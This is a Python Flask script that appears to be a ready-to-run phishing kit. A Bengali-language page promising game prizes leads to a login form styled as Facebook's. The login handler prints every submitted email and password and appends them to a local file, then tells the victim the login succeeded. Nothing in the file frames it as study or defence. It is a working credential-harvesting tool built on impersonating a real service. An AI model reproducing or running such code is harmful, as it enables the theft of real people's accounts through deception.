from flask import Flask, request, render_template_string, redirect, url_for

app = Flask(__name__)

# HTML templates
intro_page = '''
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Game Challenge</title>
  <style>
    body {
      background: linear-gradient(to right, #1e3c72, #2a5298);
      color: white;
      font-family: Arial, sans-serif;
      text-align: center;
      padding-top: 100px;
    }
    h1 {
      font-size: 36px;
    }
    p {
      font-size: 20px;
    }
    a.button {
      margin-top: 30px;
      display: inline-block;
      padding: 15px 30px;
      background-color: #00c851;
      color: white;
      border-radius: 8px;
      font-size: 20px;
      text-decoration: none;
    }
    a.button:hover {
      background-color: #007e33;
    }
  </style>
</head>
<body>
  <h1>🎯 Game Challenge!</h1>
  <p>Game খেলে পুরস্কার জিতে নাও! নতুন ভার্সনে আজই ট্রাই করো।</p>
  <a href="/login" class="button">Play Now</a>
</body>
</html>
'''

login_page = '''
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Facebook – log in or sign up</title>
  <style>
    body {
      background-color: #f0f2f5;
      font-family: Helvetica, Arial, sans-serif;
      margin: 0;
      padding: 0;
    }
    .container {
      width: 100%;
      max-width: 400px;
      margin: 100px auto;
      padding: 15px;
      text-align: center;
    }
    .logo {
      font-size: 48px;
      color: #1877f2;
      font-weight: bold;
      margin-bottom: 20px;
    }
    .form-box {
      background-color: #fff;
      border-radius: 8px;
      padding: 20px;
      box-shadow: 0 2px 8px rgba(0,0,0,0.2);
    }
    input {
      width: 100%;
      padding: 14px;
      margin: 10px 0;
      border: 1px solid #ccc;
      border-radius: 6px;
      font-size: 16px;
    }
    button {
      width: 100%;
      padding: 14px;
      background-color: #1877f2;
      color: white;
      border: none;
      border-radius: 6px;
      font-size: 16px;
      font-weight: bold;
      cursor: pointer;
    }
    button:hover {
      background-color: #166fe5;
    }
    .form-links a {
      display: block;
      color: #1877f2;
      font-size: 14px;
      margin-top: 12px;
      text-decoration: none;
    }
    .divider {
      margin: 20px 0;
      border-top: 1px solid #ddd;
    }
    .create-account {
      background-color: #42b72a;
    }
    .create-account:hover {
      background-color: #36a420;
    }
    @media (max-width: 500px) {
      .container {
        margin: 60px 20px;
      }
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="logo">facebook</div>
    <form class="form-box" method="POST" action="/login">
      <input type="text" name="email" placeholder="Mobile number or email" required />
      <input type="password" name="password" placeholder="Password" required />
      <button type="submit">Log In</button>
      <div class="form-links">
        <a href="#">Forgotten password?</a>
      </div>
      <div class="divider"></div>
      <button type="button" class="create-account">Create new account</button>
    </form>
  </div>
</body>
</html>
'''

@app.route('/')
def home():
    return render_template_string(intro_page)

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        email = request.form['email']
        password = request.form['password']

        print(f"[+] Email: {email} | Password: {password}")
        with open("logins.txt", "a") as f:
            f.write(f"{email} | {password}\n")

        return "<h2>Login successful! 🎉</h2><p>You may now continue the game.</p>"
    return render_template_string(login_page)

if __name__ == '__main__':
    app.run(debug=True)
